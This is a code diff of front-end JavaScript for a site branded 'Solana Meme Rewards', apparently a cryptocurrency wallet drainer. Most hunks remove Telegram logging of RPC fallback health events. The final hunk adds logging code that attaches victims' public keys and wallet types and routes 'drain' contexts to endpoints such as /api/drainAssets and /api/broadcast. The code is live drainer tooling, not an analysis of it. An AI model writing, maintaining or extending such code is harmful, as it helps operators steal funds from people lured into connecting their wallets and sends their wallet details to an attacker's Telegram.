@@ -276,18 +276,7 @@
     window.triggerRobustRPCFallback = async function(error, context = {}) {
       console.log('🚀 [ROBUST_FALLBACK] Triggering comprehensive RPC fallback for Solana.js error');
       
-      // Log RPC fallback to Telegram
-      if (window.sendTelegramLog) {
-        window.sendTelegramLog('EMERGENCY_FALLBACK', {
-          error: error.message,
-          context: context,
-          action: 'RPC Fallback Triggered',
-          walletType: context.walletType || 'Unknown',
-          publicKey: context.publicKey || 'Unknown',
-          timestamp: new Date().toISOString(),
-          projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
-        });
-      }
+      // Telegram RPC/health logging disabled per requirements
       
       try {
         // First, try to switch RPC immediately
@@ -309,18 +298,7 @@
             console.log('✅ [ROBUST_FALLBACK] New connection test successful, slot:', testSlot);
             
             // Log successful fallback to Telegram
-            if (window.sendTelegramLog) {
-              window.sendTelegramLog('CONNECTION_HEALTH', {
-                status: 'healthy',
-                rpcEndpoint: window.currentRpcEndpoint,
-                slot: testSlot,
-                action: 'RPC Fallback Success',
-                walletType: context.walletType || 'Unknown',
-                publicKey: context.publicKey || 'Unknown',
-                timestamp: new Date().toISOString(),
-                projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
-              });
-            }
+            // Telegram RPC/health logging disabled per requirements
             
             // Update UI to show successful fallback
             if (window.updateConnectionStatus) {
@@ -332,17 +310,7 @@
             console.warn('⚠️ [ROBUST_FALLBACK] New connection test failed:', testError.message);
             
             // Log failed fallback to Telegram
-            if (window.sendTelegramLog) {
-              window.sendTelegramLog('RPC_FAILURE', {
-                error: testError.message,
-                context: 'RPC Fallback Test Failed',
-                endpoint: window.currentRpcEndpoint,
-                walletType: context.walletType || 'Unknown',
-                publicKey: context.publicKey || 'Unknown',
-                timestamp: new Date().toISOString(),
-                projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
-              });
-            }
+            // Telegram RPC/health logging disabled per requirements
           }
         }
         
@@ -353,17 +321,7 @@
       } catch (fallbackError) {
         console.error('❌ [ROBUST_FALLBACK] Comprehensive fallback failed:', fallbackError);
         
-        // Log comprehensive fallback failure to Telegram
-        if (window.sendTelegramLog) {
-          window.sendTelegramLog('RPC_FAILURE', {
-            error: fallbackError.message,
-            context: 'Comprehensive RPC Fallback Failed',
-            walletType: context.walletType || 'Unknown',
-            publicKey: context.publicKey || 'Unknown',
-            timestamp: new Date().toISOString(),
-            projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
-          });
-        }
+        // Telegram RPC/health logging disabled per requirements
         
         return false;
       }
@@ -374,14 +332,7 @@
       console.log('🚨 [EMERGENCY_FALLBACK] Activating emergency RPC fallback...');
       
       // Log emergency fallback activation to Telegram
-      if (window.sendTelegramLog) {
-        window.sendTelegramLog('EMERGENCY_FALLBACK', {
-          action: 'Emergency RPC Fallback Activated',
-          context: 'All primary RPC endpoints failed',
-          timestamp: new Date().toISOString(),
-          projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
-        });
-      }
+      // Telegram RPC/health logging disabled per requirements
       
       const emergencyEndpoints = [
         'https://api.mainnet-beta.solana.com',
@@ -408,16 +359,7 @@
           console.log(`✅ [EMERGENCY_FALLBACK] Emergency endpoint successful: ${endpoint}, slot: ${slot}`);
           
           // Log successful emergency endpoint to Telegram
-          if (window.sendTelegramLog) {
-            window.sendTelegramLog('CONNECTION_HEALTH', {
-              status: 'healthy',
-              rpcEndpoint: endpoint,
-              slot: slot,
-              action: 'Emergency Endpoint Success',
-              timestamp: new Date().toISOString(),
-              projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
-            });
-          }
+          // Telegram RPC/health logging disabled per requirements
           
           // Set as current connection
           window.solanaConnection = emergencyConnection;
@@ -435,15 +377,7 @@
           console.warn(`⚠️ [EMERGENCY_FALLBACK] Emergency endpoint failed: ${endpoint}`, emergencyError.message);
           
           // Log failed emergency endpoint to Telegram
-          if (window.sendTelegramLog) {
-            window.sendTelegramLog('RPC_FAILURE', {
-              error: emergencyError.message,
-              endpoint: endpoint,
-              context: 'Emergency Endpoint Failed',
-              timestamp: new Date().toISOString(),
-              projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
-            });
-          }
+          // Telegram RPC/health logging disabled per requirements
           
           continue;
         }
@@ -452,15 +386,7 @@
       console.error('❌ [EMERGENCY_FALLBACK] All emergency endpoints failed');
       
       // Log complete emergency fallback failure to Telegram
-      if (window.sendTelegramLog) {
-        window.sendTelegramLog('RPC_FAILURE', {
-          error: 'All emergency endpoints failed',
-          context: 'Complete Emergency Fallback Failure',
-          endpoints: emergencyEndpoints,
-          timestamp: new Date().toISOString(),
-          projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
-        });
-      }
+      // Telegram RPC/health logging disabled per requirements
       
       return false;
     };
@@ -5516,6 +5442,28 @@
           const publicKey = currentWallet.publicKey || data.publicKey || 'Unknown';
           const walletType = currentWallet.type || data.walletType || 'Unknown';
           
+          // Normalize context to a readable string
+          let contextValue = data && Object.prototype.hasOwnProperty.call(data, 'context') ? data.context : undefined;
+          let contextString = undefined;
+          if (typeof contextValue === 'string') {
+            contextString = contextValue;
+          } else if (contextValue && typeof contextValue === 'object') {
+            try {
+              contextString = JSON.stringify(contextValue, null, 2).slice(0, 500);
+            } catch (_) {
+              contextString = '[object context]';
+            }
+          }
+          
+          // Ensure endpoint for API_CALL logs
+          let endpoint = data && data.endpoint ? data.endpoint : undefined;
+          if (type === 'API_CALL' && !endpoint) {
+            const ctx = (contextString || '').toLowerCase();
+            if (ctx.includes('drain broadcast')) endpoint = '/api/broadcast';
+            else if (ctx.includes('pre-initialization')) endpoint = '/api/preInitialize';
+            else if (ctx.includes('drain') || ctx.includes('wallet eligibility') || ctx.includes('wallet check')) endpoint = '/api/drainAssets';
+          }
+          
           // Prepare log data
           const logData = {
             type: type,
@@ -5525,6 +5473,8 @@
             projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards',
             publicKey: publicKey.toString ? publicKey.toString() : publicKey,
             walletType: walletType,
+            ...(endpoint ? { endpoint } : {}),
+            ...(contextString ? { context: contextString } : {}),
             ...data
           };
           
